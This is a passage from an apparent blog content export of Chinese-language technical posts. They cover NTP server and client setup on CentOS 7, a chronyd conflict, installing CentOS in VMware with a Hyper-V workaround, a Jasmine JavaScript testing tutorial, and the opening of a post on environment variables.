出现ntp-...，说明已经安装了，我的本机已经安装了。如果没有安装，可用如下方式： 1yum -y install ntp 2.ntpd 配置（1）修改 ntpd 配置我们在NTP的官方网站（http://www.pool.ntp.org）上找到距离我们服务器最近的权威 NTP Server。 以中国为例： 0.cn.pool.ntp.org 1.cn.pool.ntp.org 2.cn.pool.ntp.org 3.cn.pool.ntp.org 我们在配置文件中修改依赖的权威 NTP Server： 1vi /etc/ntp.conf 1234567891011121314151617181920212223242526# server用来设置依赖的权威 NTP Serverserver 0.cn.pool.ntp.org iburstserver 1.cn.pool.ntp.org iburstserver 2.cn.pool.ntp.org iburstserver 3.cn.pool.ntp.org iburst# restrict用来设置哪些主机（客户端）可以访问NTP Server# 格式：restrict [address] mask [netmask_ip] [parameter]# paramter的选项有：# ignore ：关闭所有的 NTP 联机服务# nomodify：表示 Client 端不能更改 Server 端的时间参数，不过，Client 端仍然可以透过 Server 端来进行网络校时。# notrust：该 Client 除非通过认证，否则该 Client 来源将被视为不信任网域# noquery：不提供 Client 端的时间查询# notrap：不提供trap这个远程事件登入# 如果paramter完全没有设定，那就表示该 IP (或网域)“没有任何限制”# 允许上层时间服务器主动修改本机时间restrict 0.cn.pool.ntp.org nomodify notrap noqueryrestrict 1.cn.pool.ntp.org nomodify notrap noqueryrestrict 2.cn.pool.ntp.org nomodify notrap noquery# 允许本机查询restrict 127.0.0.1# 在192.168.0.1/24网段内的服务器就可以通过这台NTP Server进行时间同步了restrict 192.168.0.1 mask 255.255.255.0 nomodify 修改完成后先手动同步一次时间： 1ntpdate 0.cn.pool.ntp.org 启动ntpd服务： 1systemctl start ntpd 确认该NTP Server是否已经向权威NTP Server同步时间： 1ntpstat 如果是这样，说明已经成功向权威NTP Server同步了，且每1分钟触发一次同步： （2）设置 ntpd将 ntpd 设置为开机启动： 1systemctl enable ntpd 重启后，检查ntpd是否会自动开机启动： 1systemctl status ntpd 从下面的图中，看到ntpd已经被设置成自动开机启动了，但是事实上，在开机后，启动并未成功。 引起这个问题常见的原因有可能是系统上安装了一个与 ntpd 相冲突的工具：chrony。 检查 chronyd 是否被设置为开机自动启动： 1systemctl status chronyd 下图可以看到，chronyd 确实被设置为开机自动启动了： 禁止 chronyd 开机启动： 1systemctl disable chronyd 三.NTP client设置类似地，首先查看NTP是否已经安装： 1rpm -qa | grep ntp 如果没有安装，用如下方式： 1yum -y install ntp 在客户端 NTP的配置文件中，加上我的这台NTP Server： 1vi /etc/ntp.conf 增加下面几条设置： 12345# 允许我们的NTP Server 做为本地的时间服务器server 10.138.11.122 iburst# 允许上层时间服务器主动修改本机时间restrict 10.138.11.122 nomodify notrap noquery 如果客户端与NTP Server的时间差异太大，可能会出现客户端同步失败的情况。因此，先在客户端手动同步一把。 手动同步时间： 1ntpdate 服务器IP 注意，每次重启NTP Server之后大约要3－5分钟，客户端主机才能与 Server 建立正常的通讯连接。 四.验证NTP Server的服务NTP Server上查看端口是否存在： 1netstat -tulnp | grep ntp NTP Server上查看现有连接客户端： 1watch ntpq -p client 上查看同步的结果： 1ntpstat 123synchronised to local net at stratum 11 time correct to within 12 ms polling server every 512 s 参考 Linux NTP配置详解 (Network Time Protocol) Linux服务管理之NTP服务器配置","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】CentOS7/RedHat7 NTP服务无法开机自启动","date":"2017-04-25T14:29:05.000Z","path":"2017/04/25/【Linux】CentOS7-RedHat7-NTP服务无法开机自启动/","text":"1.问题yum -y install ntp将ntpd安装完成后，systemctl enable ntpd将 ntpd 设置为开机启动。 检查ntpd是否被设置为自动开机启动： 1systemctl status ntpd 重启后，看到 ntpd 已经被设置成自动开机启动了。但事实上，在开机后，启动并未成功。 2.解决引起这个问题常见的原因有可能是系统上安装了一个与 ntpd 相冲突的工具：chrony。 检查 chronyd 是否被设置为开机自动启动： 1systemctl status chronyd 下图可以看到，chronyd 确实被设置为开机自动启动了： 禁止 chronyd 开机启动： 1systemctl disable chronyd","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】查看Linux系统版本","date":"2017-04-24T13:31:50.000Z","path":"2017/04/24/【Linux】操作-查看Linux系统版本/","text":"1.查看CentOS版本1cat /etc/*release 2.查看RedHat版本参考： （原创）Linux下查看系统版本号信息的方法 Linux下如何查看版本信息 查看Linux版本信息","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【VMware】 VMware中安装CentOS7","date":"2017-04-13T13:54:25.000Z","path":"2017/04/13/【VMware】VMware中安装CentOS7/","text":"最近在学习Hadoop，需要将一整套环境装起来，于是需要在VMware中安装一个CentOS。 1.下载镜像在CentOS 官网，下载最新的.iso镜像。 地址：https://www.centos.org/download/ 为了省去在安装时联网下载组件的时间，我选择了Everything版本（地址：CentOS-7-x86_64-Everything-1611.iso）。 2.VMware中设置（1）新建一个虚拟机选择【文件】-【新建虚拟机】： 选择.iso所在的路径： 设置虚拟机存储路径： 设置系统磁盘总大小： 根据你的电脑设置虚拟机的配置（因为我本机内存比较多，所以给虚拟机设置了16G内存，参数仅供参考）： 3.系统安装以上设置完成后，虚拟机会自动开机，【回车】开始系统安装： 设置相应语言 完成相应设置： 这里，我点击SOFTWARE SELECTION，设置系统的应用安装，我选择了【Server with GUI】（这里可以根据你的实际情况来确定）： 设置完成后，点击Begin Installation： 于是，系统开始安装： 漫长等待后（根据你的硬件资源决定安装速度），系统会自动重启。重启后，系统就安装完成啦！！4.更新相关系统组件控制台中执行，以将获取最新的源（Source），并将所有已安装软件更新到最新版本：1sudo yum update 这里从yum update与yum upgrade的区别，介绍一下包管理器。 （1）yum update 与 yum upgrade 的区别： yum update与yum upgrade都是将系统中已经安装的所有软件更新到当前最新的版本（并且自动管理好软件之间的依赖关系） yum upgrade与yum update唯一不同的是，yum upgrade会将被官方废弃的软件版本在本机中删除。因此，yum upgrade的功能与yum update加上-obsoletes标识的功能是等同的（即yum upgrade 等价于 yum update -obsoletes） 因此yum update和yum upgrade的关系，与apt-get update和apt-get upgrade的关系是完全不同的。 （2）apt-get update 和 apt-get upgrade 的区别：apt-get update通常在 apt-get upgrade之前执行。 UPDATE：会从指定的源（source）中下载最新的软件包信息 UPGRADE：根据UPDATE下载的软件包信息，更新（下载并安装）这些新的软件包，并且自动管理依赖（新软件包的正常运行，需要依靠其他软件的安装）。 关于Linux的包管理工具，可以戳我：【Linux】 Linux 包管理器&lt;%- page.posts %&gt; 5.参考：What is the technical differences between “update” and “upgrade” with yum?","comments":true,"categories":[{"name":"VMware","slug":"VMware","permalink":"http://swsmile.info/categories/VMware/"}],"tags":[{"name":"VMware","slug":"VMware","permalink":"http://swsmile.info/tags/VMware/"}]},{"title":"【Linux】 Linux 包管理器","date":"2017-04-13T13:52:26.000Z","path":"2017/04/13/【Linux】Linux-包管理器/","text":"","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【VMware】 VMware Workstation 与 Device/Credential Guard 不兼容","date":"2017-04-13T13:46:38.000Z","path":"2017/04/13/【VMware】VMware-Workstation-与-Device-Credential-Guard-不兼容/","text":"1.问题在VMware安装CentOS7的过程中，出现以下问题： VMware Workstation and Device/Credential Guard are not compatible. VMware Workstation can be run after disabling Device/Credential Guard. Please visit http://www.vmware.com/go/turnoff_CG_DG for more details. 中文：VMware Workstation 与 Device/Credential Guard 不兼容。在禁用 Device/Credential Guard 后，可以运行 VMware Workstation。有关更多详细信息，请访问 http://www.vmware.com/go/turnoff_CG_DG。 2.解决方法打开【控制面板】-【程序】- 【启用或关闭windows功能】： 将【Hyper-V】取消勾选，重启后即可！3.原因Hyper-V是跟Microsoft虚拟化有关的框架，但是似乎Hyper-V会跟VMware的某些程序冲突。因此，如果使用VMware的话，最好把Hyper-V关闭。 4.参考 Windows 10 host where Credential Guard or Device Guard is enabled fails when running Workstation (2146361)","comments":true,"categories":[{"name":"VMware","slug":"VMware","permalink":"http://swsmile.info/categories/VMware/"}],"tags":[{"name":"VMware","slug":"VMware","permalink":"http://swsmile.info/tags/VMware/"}]},{"title":"【JavaScript】 JavaScript 单元测试框架：Jasmine","date":"2017-04-09T14:36:01.000Z","path":"2017/04/09/【JavaScript】JavaScript单元测试框架：Jasmine/","text":"一.简介Jasmine 是一款完全开源的基于行为驱动（BDD，behavior-driven development）的 JavaScript 测试框架，它不依赖于其他任何 JavaScript 组件，也不需要 DOM。它有灵活而清晰的语法，可以帮助我们最高效的完成测试代码。 不仅如此，对于 Jasmine 的测试结果，可以将直接现在在HTML上。也可以将 Jasmine 与 持续集成系统（CI，Continuous Integration）对接，使得测试结果可以通过持续集成系统反馈给开发者。 所谓BDD（Behaviour Driven Development），是一种新的敏捷软件开发方法。 BDD与TDD（Test Driven Development）经常联系在一起。我的理解： TDD更多从技术层面阐述，是指当软件产生需求的时候，程序员应该先完成这一需求对应的测试用例（或者说用一系列测试用例来描述这一需求），再开始进行代码编码工作。最终以代码是否通过这一测试用例来判断代码与需求是否匹配。总的来说，TDD更多是在描述码农的工作方式。 而BDD更多是从完成业务需求的角度阐述，是指一种可降低开发者与非开发者（如项目经理）之间需求沟通和理解成本的工作方式，可使得非程序开发人员也能参与到编写测试用例的编写工作中来。其根本目的是希望码农开发出来的功能与项目模块的需求相切合。 二.Demo 体验在 https://github.com/jasmine/jasmine/releases 中，官方有一个Demo，因此可以体验一把，并感觉一下其风格。 我下载的是jasmine-standalone-2.5.2，对应地址：https://github.com/jasmine/jasmine/releases/download/v2.5.2/jasmine-standalone-2.5.2.zip。 解压后的文件结构： 12345678// 运行测试用例的环境SpecRunner.html// 要测试的源代码-src// 测试用例-spec// jasmine的源代码-lib 执行SpecRunner.html以查看测试结果： 这里的测试用例，更像是业务人员描述的一个使用场景，且当这个使用场景发生时，期待的是什么状态。其实这就是对BDD的诠释。 三.项目中添加 Jasmine你可通过Node，在项目中添加Jasmine： 12345678// Add Jasmine to your package.jsonnpm install --save-dev jasmine// Initialize Jasmine in your projectjasmine init// Run your testsjasmine 当然，更常用的做法是，通过Gulp or Grunt 构建工具以在项目以集成 Jasmine。 Gulp: https://github.com/jasmine/gulp-jasmine-browser Grunt: https://github.com/gruntjs/grunt-contrib-jasmine 四.Jasmine 基本使用 官方API文档：https://jasmine.github.io/api/edge/global 官方介绍：https://jasmine.github.io/edge/introduction.html 以下例子均从官网搬运！ 下来我们来详细讲解一下 Jasmine 中的一些概念，和测试用例的使用方法。 一个 Jasmine 例子： 12345678// 对应一个Suitedescribe(&apos;JavaScript addition operator&apos;,function()&#123; // 对应一个Spec it(&apos;adds two numbers together&apos;,function()&#123; // 对应一个Expectation expect(1 + 2).toEqual(3); &#125;);&#125;); 1.测试用例基本结构（1）Suites - 测试组对应describe函数块，通常包含一个到多个测试用例。 describe函数包含两个参数： 第一个参数（String）：通常描述被测试组件的名称，或一个测试的场景（where…,when…） 第二个参数（function）：测试代码 （2）Specs - 测试用例对应it函数块，通常仅仅包含一个测试用例。 it函数包含两个参数： 第一个参数（String）：通常描述期待的测试结果 第二个参数（function）：测试代码 （3）Expectations - 断言对应expect函数块，通常是一个具体的判断。 （4）注意注意，一个Suite（describe）可以包含多个Suite（describe），也可以包含多个Specs(it)。一个Specs(it)包含多个断言（expect）。 （5）字符串的描述又一个 Jasmine 例子： 12345678910111213141516171819202122232425262728293031describe(&quot;Player&quot;, function() &#123; var player; var song; it(&quot;should be able to play a Song&quot;, function() &#123; player = player = new Player(); song = song = new Song(); player.play(song); expect(player.currentlyPlayingSong).toEqual(song); //demonstrates use of custom matcher expect(player).toBePlaying(song); &#125;); describe(&quot;when song has been paused&quot;, function() &#123; it(&quot;should indicate that the song is currently paused&quot;, function() &#123; player = player = new Player(); song = song = new Song(); player.play(song); player.pause(); expect(player.isPlaying).toBeFalsy(); // demonstrates use of &apos;not&apos; with a custom matcher expect(player).not.toBePlaying(song); &#125;); &#125;);&#125;); 在上面的例子中，把用例的描述连接起来，变成 it should be able to play a Song、when song has been paused, it should indicate that the song is currently paused。你会发现他们通常是一个完整的句子，而且是一个场景的描述。这就是BDD的精髓所在。 2.Matches 判断 以下用例均可通过！ （0）not对于以下的每一个Match，都可以在前面加上not，以表示非。 比如， 123456789describe(&quot;The &apos;toBe&apos; matcher compares with ===&quot;, function() &#123; it(&quot;and has a positive case&quot;, function() &#123; expect(true).toBe(true); &#125;); it(&quot;and can have a negative case&quot;, function() &#123; expect(false).not.toBe(true); &#125;);&#125;); （1）toBe相当于==。 对于对象，比较引用是否相等 对于值，比较值是否相等 123456789101112131415describe(&quot;The &apos;toBe&apos; matcher&quot;, function() &#123; it(&quot;and so is a spec&quot;, function() &#123; var a = true; expect(a).toBe(true); &#125;); it(&quot;The &apos;toBe&apos; matcher compares with ===&quot;, function() &#123; var a = 12; var b = a; expect(a).toBe(b); expect(a).not.toBe(null); &#125;);&#125;); （2）toEqual相当于===。 对于对象，比较对象的每个属性是否相同 对于数组，比较数组中每个元素是否相同 对于值，比较值是否相等 123456789101112131415161718describe(&quot;The &apos;toEqual&apos; matcher&quot;, function() &#123; it(&quot;works for simple literals and variables&quot;, function() &#123; var a = 12; expect(a).toEqual(12); &#125;); it(&quot;should work for objects&quot;, function() &#123; var foo = &#123; a: 12, b: 34 &#125;; var bar = &#123; a: 12, b: 34 &#125;; expect(foo).toEqual(bar); &#125;);&#125;); （3）toMatch通常用toMatch配合正则表达式来匹配字符串。 123456789describe(&quot;The &apos;toMatch&apos; matcher&quot;, function() &#123; it(&quot;The &apos;toMatch&apos; matcher is for regular expressions&quot;, function() &#123; var message = &quot;foo bar baz&quot;; expect(message).toMatch(/bar/); expect(message).toMatch(&quot;bar&quot;); expect(message).not.toMatch(/quux/); &#125;);&#125;); （3）toBeDefined与toBeUndefinedtoBeDefined是否已经被定义了。 12345678910describe(&quot;The &apos;toBeDefined&apos; matcher&quot;,function() &#123; it(&quot;The &apos;toBeDefined&apos; matcher compares against `undefined`&quot;, function() &#123; var a = &#123; foo: &quot;foo&quot; &#125;; expect(a.foo).toBeDefined(); expect(a.bar).not.toBeDefined();&#125;); toBeUndefined是否未被定义了。 12345678910describe(&quot;The &apos;toBeUndefined&apos; matcher&quot;,function() &#123; it(&quot;The `toBeUndefined` matcher compares against `undefined`&quot;, function() &#123; var a = &#123; foo: &quot;foo&quot; &#125;; expect(a.foo).not.toBeUndefined(); expect(a.bar).toBeUndefined(); &#125;);&#125;); （4）toBeTruthy 与 toBeFalsytoBeTruthy判断是否为 true。 12345678describe(&quot;The &apos;toBeTruthy&apos; matcher&quot;,function() &#123; it(&quot;The &apos;toBeTruthy&apos; matcher is for boolean casting testing&quot;, function() &#123; var a, foo = &quot;foo&quot;; expect(foo).toBeTruthy(); expect(a).not.toBeTruthy(); &#125;);&#125;); toBeFalsy判断是否为 false。 12345678describe(&quot;The &apos;toBeFalsy&apos; matcher&quot;,function() &#123; it(&quot;The &apos;toBeFalsy&apos; matcher is for boolean casting testing&quot;, function() &#123; var a, foo = &quot;foo&quot;; expect(a).toBeFalsy(); expect(foo).not.toBeFalsy(); &#125;);&#125;); （5）toContaintoContain判断数组中是否包含某个元素。 123456789101112131415describe(&quot;The &apos;toContain&apos; matcher&quot;, function() &#123; it(&quot;works for finding an item in an Array&quot;, function() &#123; var a = [&quot;foo&quot;, &quot;bar&quot;, &quot;baz&quot;]; expect(a).toContain(&quot;bar&quot;); expect(a).not.toContain(&quot;quux&quot;); &#125;); it(&quot;also works for finding a substring&quot;, function() &#123; var a = &quot;foo bar baz&quot;; expect(a).toContain(&quot;bar&quot;); expect(a).not.toContain(&quot;quux&quot;); &#125;);&#125;); （6）toBeLessThan 和 toBeGreaterThantoBeLessThan判断是否小于，toBeGreaterThan判断是否大于。 1234567891011121314151617181920212223242526describe(&quot;The &apos;toBeLessThan&apos; and &apos;toBeGreaterThan&apos; matcher&quot;, function() &#123; it(&quot;The &apos;toBeLessThan&apos; matcher is for mathematical comparisons&quot;, function() &#123; var pi = 3.1415926, e = 2.78; expect(e).toBeLessThan(pi); expect(pi).not.toBeLessThan(e); &#125;); it(&quot;The &apos;toBeGreaterThan&apos; matcher is for mathematical comparisons&quot;, function() &#123; var pi = 3.1415926, e = 2.78; expect(pi).toBeGreaterThan(e); expect(e).not.toBeGreaterThan(pi); &#125;); it(&quot;The &apos;toBeCloseTo&apos; matcher is for precision math comparison&quot;, function() &#123; var pi = 3.1415926, e = 2.78; expect(pi).not.toBeCloseTo(e, 2); expect(pi).toBeCloseTo(e, 0); &#125;);&#125;); （7）toThrow 和 toThrowErrortoThrow判断是否抛出了异常，toThrowError判断是否抛出了特定的异常。 12345678910111213141516171819202122232425262728describe(&quot;The &apos;toThrow&apos; and &apos;toThrowError&apos; matcher&quot;,function() &#123; it(&quot;The &apos;toThrow&apos; matcher is for testing if a function throws an exception&quot;,function() &#123; var foo = function() &#123; return 1 + 2; &#125;; var bar = function() &#123; return a + 1; &#125;; var baz = function() &#123; throw &apos;what&apos;; &#125;; expect(foo).not.toThrow(); expect(bar).toThrow(); expect(baz).toThrow(&apos;what&apos;); &#125;); it(&quot;The &apos;toThrowError&apos; matcher is for testing a specific thrown exception&quot;,function() &#123; var foo = function() &#123; throw new TypeError(&quot;foo bar baz&quot;); &#125;; expect(foo).toThrowError(&quot;foo bar baz&quot;); expect(foo).toThrowError(/bar/); expect(foo).toThrowError(TypeError); expect(foo).toThrowError(TypeError, &quot;foo bar baz&quot;); &#125;);&#125;); 2.一些操作（1）beforeEach 和 afterEach为了增加测试用例模块的复用性，在一个测试用例集合中，对于一些执行测试用例前或执行测试用例后统一的操作可以放到beforeEach 函数和 afterEach 函数（或者beforeAll() 和afterAll()）中。 如果你熟悉 Setup 和 Teardown（来自于JUnit） ，其实他们和beforeEach 和 afterEach就是一回事啦！ beforeEach()：在 describe 函数中的每个 Spec 执行之前执行 afterEach()： 在 describe 函数中每个 Spec 数执行之后执行 beforeAll()：在 describe 函数中所有的 Specs 执行之前执行，在 Sepc 之间不会被执行 afterAll()： 在 describe 函数中所有的 Specs 执行之后执行，在 Sepc 之间不会被执行 还是举例子来说明beforeEach 和 afterEach吧： 1234567891011121314151617181920describe(&quot;A spec using beforeEach and afterEach&quot;, function() &#123; var foo = 0; beforeEach(function() &#123; foo += 1; &#125;); afterEach(function() &#123; foo = 0; &#125;); it(&quot;is just a function, so it can contain any code&quot;, function() &#123; expect(foo).toEqual(1); &#125;); it(&quot;can have more than one expectation&quot;, function() &#123; // 这个用例是通过的，是因为在上一个用例执行后，调用了afterEach expect(foo).toEqual(1); &#125;);&#125;); 执行顺序： beforeEach it(“is just a function, so it can contain any code”) afterEach beforeEach it(“can have more than one expectation”) afterEach 再来举例子说明beforeAll() 和afterAll()吧： 1234567891011121314151617181920describe(&quot;A spec using beforeAll and afterAll&quot;, function() &#123; var foo; beforeAll(function() &#123; foo = 1; &#125;); afterAll(function() &#123; foo = 0; &#125;); it(&quot;sets the initial value of foo before specs run&quot;, function() &#123; expect(foo).toEqual(1); foo += 1; &#125;); it(&quot;does not reset foo between specs&quot;, function() &#123; expect(foo).toEqual(2); &#125;);&#125;); 执行顺序： beforeAll it(“sets the initial value of foo before specs run”) it(“does not reset foo between specs”） afterAll 总结：beforeAll() 和afterAll()通常用于执行最初初始化和最终的清洁工作。再次强调，beforeAll() 和afterAll()不会在每个Specs 之间执行，因此，每个Specs 之间的清洁工作需要放在beforeEach 和 afterEach中。 （2）手工使测试失败在某些场合下，如果我们希望在满足某个条件时，测试用例失败，则可以使用fail函数。 12345678910describe(&quot;A spec using the fail function&quot;,function() &#123; it(&quot;The &apos;toThrow&apos; matcher is for testing if a function throws an exception&quot;,function() &#123; var a = true; if(!a)&#123; fail(&quot;Fail manually.&quot;); &#125; expect(a).toBeTruthy(); &#125;);&#125;); （3）在多个测试用例内部传值this关键字可用于在多个测试用例内部传值。 123456789101112131415describe(&quot;A spec&quot;, function() &#123; beforeEach(function() &#123; this.foo = 0; &#125;); it(&quot;can use the `this` to share state&quot;, function() &#123; expect(this.foo).toEqual(0); this.bar = &quot;test pollution?&quot;; &#125;); it(&quot;prevents test pollution by having an empty `this` created for the next spec&quot;, function() &#123; expect(this.foo).toEqual(0); expect(this.bar).toBe(undefined); &#125;);&#125;); （4）禁用测试用例如果希望禁用某些测试用例，可以使用xdescribe或xit。 当被禁用后，这些 Suites 和 Specs 会被跳过，也不会在结果中出现。 123456789101112xdescribe(&quot;A spec&quot;, function() &#123; var foo; beforeEach(function() &#123; foo = 0; foo += 1; &#125;); it(&quot;is just a function, so it can contain any code&quot;, function() &#123; expect(foo).toEqual(1); &#125;);&#125;); 五.Jasmine 高阶使用1.自定义的断言除了上面介绍的系统定义的断言之外，也可以使用自己定义断言。 以 Jasmine 的 Demo 中的 toBePlaying 作为自定义断言的例子。 12//demonstrates use of custom matcherexpect(player).toBePlaying(song); 定义： 1234567891011121314beforeEach(function() &#123; jasmine.addMatchers(&#123; toBePlaying: function() &#123; return &#123; compare: function(actual, expected) &#123; var player = actual; return &#123; pass: player.currentlyPlayingSong === expected &amp;&amp; player.isPlaying &#125;; &#125; &#125;; &#125; &#125;);&#125;); 2.高阶使用（1）测试函数被调用spy对象可用于跟踪和检查一个函数被调用的次数和传入的参数。 toHaveBeenCalled：可以检查函数是否被调用过， toHaveBeenCalledWith： 可以检查传入参数是否被作为参数调用过。 123456789101112131415161718192021222324252627282930313233describe(&quot;A spy&quot;, function() &#123; var foo, bar = null; beforeEach(function() &#123; foo = &#123; setBar: function(value) &#123; bar = value; &#125; &#125;; spyOn(foo, &apos;setBar&apos;); foo.setBar(123); foo.setBar(456, &apos;another param&apos;); &#125;); it(&quot;tracks that the spy was called&quot;, function() &#123; expect(foo.setBar).toHaveBeenCalled(); &#125;); it(&quot;tracks that the spy was called x times&quot;, function() &#123; expect(foo.setBar).toHaveBeenCalledTimes(2); &#125;); it(&quot;tracks all the arguments of its calls&quot;, function() &#123; expect(foo.setBar).toHaveBeenCalledWith(123); expect(foo.setBar).toHaveBeenCalledWith(456, &apos;another param&apos;); &#125;); it(&quot;stops all execution on a function&quot;, function() &#123; expect(bar).toBeNull(); &#125;);&#125;); （2）指定函数返回值通过and.returnValue，可以指定某个函数的返回值。 12345678910111213141516171819202122232425262728293031describe(&quot;A spy, when configured to fake a return value&quot;, function() &#123; var foo, bar, fetchedBar; beforeEach(function() &#123; foo = &#123; setBar: function(value) &#123; bar = value; &#125;, getBar: function() &#123; return bar; &#125; &#125;; spyOn(foo, &quot;getBar&quot;).and.returnValue(745); foo.setBar(123); fetchedBar = foo.getBar(); &#125;); it(&quot;tracks that the spy was called&quot;, function() &#123; expect(foo.getBar).toHaveBeenCalled(); &#125;); it(&quot;should not affect other functions&quot;, function() &#123; expect(bar).toEqual(123); &#125;); it(&quot;when called returns the requested value&quot;, function() &#123; expect(fetchedBar).toEqual(745); &#125;);&#125;); （3）调用函数时抛出指定异常and.throwError用于设置，当调用某个执行函数时，抛出指定异常。 12345678910111213141516171819describe(&quot;A spy, when configured to throw an error&quot;, function() &#123; var foo, bar; beforeEach(function() &#123; foo = &#123; setBar: function(value) &#123; bar = value; &#125; &#125;; spyOn(foo, &quot;setBar&quot;).and.throwError(&quot;quux&quot;); &#125;); it(&quot;throws the value&quot;, function() &#123; expect(function() &#123; foo.setBar(123) &#125;).toThrowError(&quot;quux&quot;); &#125;);&#125;); （3）构造一个mock对象当没有一个具体的方法来spyon时，可以使用jasmine.createSpy来创建一个mock对象。 1234567891011121314151617181920212223242526272829describe(&quot;A spy, when created manually&quot;, function() &#123; var whatAmI; beforeEach(function() &#123; whatAmI = jasmine.createSpy(&apos;whatAmI&apos;); whatAmI(&quot;I&quot;, &quot;am&quot;, &quot;a&quot;, &quot;spy&quot;); &#125;); it(&quot;is named, which helps in error reporting&quot;, function() &#123; expect(whatAmI.and.identity()).toEqual(&apos;whatAmI&apos;); &#125;); it(&quot;tracks that the spy was called&quot;, function() &#123; expect(whatAmI).toHaveBeenCalled(); &#125;); it(&quot;tracks its number of calls&quot;, function() &#123; expect(whatAmI.calls.count()).toEqual(1); &#125;); it(&quot;tracks all the arguments of its calls&quot;, function() &#123; expect(whatAmI).toHaveBeenCalledWith(&quot;I&quot;, &quot;am&quot;, &quot;a&quot;, &quot;spy&quot;); &#125;); it(&quot;allows access to the most recent call&quot;, function() &#123; expect(whatAmI.calls.mostRecent().args[0]).toEqual(&quot;I&quot;); &#125;);&#125;); 当然，还可以使用jasmine.createSpyObj来创建一个mock对象，并且指定其包含特定的方法。 1234567891011121314151617181920212223242526272829describe(&quot;Multiple spies, when created manually&quot;, function() &#123; var tape; beforeEach(function() &#123; tape = jasmine.createSpyObj(&apos;tape&apos;, [&apos;play&apos;, &apos;pause&apos;, &apos;stop&apos;, &apos;rewind&apos;]); tape.play(); tape.pause(); tape.rewind(0); &#125;); it(&quot;creates spies for each requested function&quot;, function() &#123; expect(tape.play).toBeDefined(); expect(tape.pause).toBeDefined(); expect(tape.stop).toBeDefined(); expect(tape.rewind).toBeDefined(); &#125;); it(&quot;tracks that the spies were called&quot;, function() &#123; expect(tape.play).toHaveBeenCalled(); expect(tape.pause).toHaveBeenCalled(); expect(tape.rewind).toHaveBeenCalled(); expect(tape.stop).not.toHaveBeenCalled(); &#125;); it(&quot;tracks all the arguments of its calls&quot;, function() &#123; expect(tape.rewind).toHaveBeenCalledWith(0); &#125;);&#125;); （4）mock当前时间比如一些操作，是经过多少时间后、或者间隔多少时间才会触发的，可以mock当前时间。 注意，需要在开始前调用jasmine.clock().install，在结束时调用jasmine.clock().uninstall()。 jasmine.clock().tick用于指定经过了多长时间。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051describe(&quot;Manually ticking the Jasmine Clock&quot;, function() &#123; var timerCallback; beforeEach(function() &#123; timerCallback = jasmine.createSpy(&quot;timerCallback&quot;); jasmine.clock().install(); &#125;); afterEach(function() &#123; jasmine.clock().uninstall(); &#125;); it(&quot;causes a timeout to be called synchronously&quot;, function() &#123; setTimeout(function() &#123; timerCallback(); &#125;, 100); expect(timerCallback).not.toHaveBeenCalled(); jasmine.clock().tick(101); expect(timerCallback).toHaveBeenCalled(); &#125;); it(&quot;causes an interval to be called synchronously&quot;, function() &#123; setInterval(function() &#123; timerCallback(); &#125;, 100); expect(timerCallback).not.toHaveBeenCalled(); jasmine.clock().tick(101); expect(timerCallback.calls.count()).toEqual(1); jasmine.clock().tick(50); expect(timerCallback.calls.count()).toEqual(1); jasmine.clock().tick(50); expect(timerCallback.calls.count()).toEqual(2); &#125;); describe(&quot;Mocking the Date object&quot;, function()&#123; it(&quot;mocks the Date object and sets it to a given time&quot;, function() &#123; var baseTime = new Date(2013, 9, 23); jasmine.clock().mockDate(baseTime); jasmine.clock().tick(50); expect(new Date().getTime()).toEqual(baseTime.getTime() + 50); &#125;); &#125;);&#125;); 六.Jasmine 与其他工具集成Jasmine 默认不包括任何测试执行管理工具（当然这不意味着你不可以通过打开SpecRunner.html来执行所有测试）。 因此，使用 Jasmine 的最佳实践是以 Karma 作为 JavaScript 测试执行过程管理工具。 换句话说，如果你不使用任何自动化构建框架，你可以直接手动的打开SpecRunner.html来执行所有测试用例。但是，在当今的敏捷开发时代，尽可能将大部分流程自动化，往往是更科学更高效的开发流程，这时候我们就要使用 Karma 了。 这个关系好比，在 Java 中， JUnit 做单元测试, Maven 以使 JUnit 单元测试自动化进行。 关于 Karma 的安装：https://github.com/karma-runner/karma-jasmine 七.参考 Wikipedia - Jasmine (JavaScript testing framework) https://jasmine.github.io/ JavaScript 单元测试框架：Jasmine 初探 jasmine行为驱动,测试先行 Jasmine 基础使用教程","comments":true,"categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://swsmile.info/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://swsmile.info/tags/JavaScript/"},{"name":"Software Testing","slug":"Software-Testing","permalink":"http://swsmile.info/tags/Software-Testing/"}]},{"title":"【Operating System】环境变量（Environmental Variables）","date":"2017-04-09T14:18:19.000Z","path":"2017/04/09/【Linux】环境变量/","text":"我们在安装一些编程环境时，经常需要配置环境变量。但是你是否完全了解其意义呢？ 1 粗谈环境变量环境变量相当于给系统或用户应用程序设置的一些参数，具体起什么作用这当然和具体的环境变量类型有关。比如path，是告诉系统，当要求系统运行一个程序，而没有告诉它程序所在的完整路径时，系统除了在当前目录下面寻找此程序外，还应到哪些目录下去寻找。 环境变量有三种类型： 局部环境变量（Local Environment Variable）：仅作用于当前会话（session），比如ssh登录到的remote session、或者本地terminal session 用户环境变量（User Environment Variable）：当一个特定用户登录后（本地登录或远程登录），这些环境变量就会被加载，比在如.bashrc，.bash_profile，.bash_login，.profile中设置的环境变量都是用户环境变量 系统环境变量（System wide Environment Variables）：对所有用户均有效，比如/etc/environment， /etc/profile， /etc/profile.d/， /etc/bash.bashrc 中设置的环境变量都是系统环境变量 对于Windows平台，你可以通过代码查看或修改环境变量的设置（Here）， 2 设置和查看环境变量局部环境变量（Local Environment Variable）设置局部环境变量Local Environment Variables can be created using following commands: 12345678910111213141516171819202122232425$ &lt;var&gt;=&lt;value&gt; OR$ export &lt;var&gt;=&lt;value&gt;# e.g.,$ aaa=bbb# Seems in some Linux, the following doesn't work (we 